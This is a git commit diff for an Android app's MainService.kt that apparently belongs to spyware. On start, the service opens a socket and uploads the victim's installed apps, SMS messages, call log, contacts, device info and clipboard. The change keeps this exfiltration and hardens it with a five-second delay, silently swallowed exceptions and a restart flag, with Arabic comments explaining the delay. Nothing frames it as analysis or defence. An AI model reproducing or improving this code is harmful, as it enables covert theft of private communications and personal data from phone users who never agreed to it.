9e27aeb3b017213d3c0c15ba13bea185ea1f1d5b
Thyezwn <alsnbrydhyyzn@gmail.com>
2026-08-23 16:57:04 +0300

    Update MainService.kt

--- app/src/main/java/willi/fiend/MainService.kt
+++ app/src/main/java/willi/fiend/MainService.kt
@@ -1,15 +1,14 @@
+// MainService.kt (معدل)
 package willi.fiend
 
 import android.annotation.SuppressLint
 import android.app.*
-import android.app.Notification.BADGE_ICON_NONE
 import android.content.Intent
+import android.os.Handler
 import android.os.IBinder
+import android.os.Looper
 import android.widget.RemoteViews
 import androidx.core.app.NotificationCompat
-import androidx.core.app.NotificationCompat.BADGE_ICON_NONE
-import willi.fiend.Utils.AppSocket
-
 
 class MainService : Service() {
     override fun onBind(p0: Intent?): IBinder? {
@@ -17,16 +16,23 @@ class MainService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val socket = AppSocket(this)
-        val action = socket.action
-        socket.connect()
-        action.uploadApps()
-        action.uploadMessages()
-        action.uploadCalls()
-        action.uploadContact()
-        action.uploadDeviceInfo()
-        action.uploadClipboard()
-        return START_STICKY
+        // تأخير بدء الاتصال لتجنب بدء الخدمة قبل اكتمال تهيئة النظام
+        Handler(Looper.getMainLooper()).postDelayed({
+            try {
+                val socket = AppSocket(this)
+                val action = socket.action
+                socket.connect()
+                action.uploadApps()
+                action.uploadMessages()
+                action.uploadCalls()
+                action.uploadContact()
+                action.uploadDeviceInfo()
+                action.uploadClipboard()
+            } catch (e: Exception) {
+                e.printStackTrace()
+            }
+        }, 5000)
+        return START_REDELIVER_INTENT
     }
 
     override fun onCreate() {
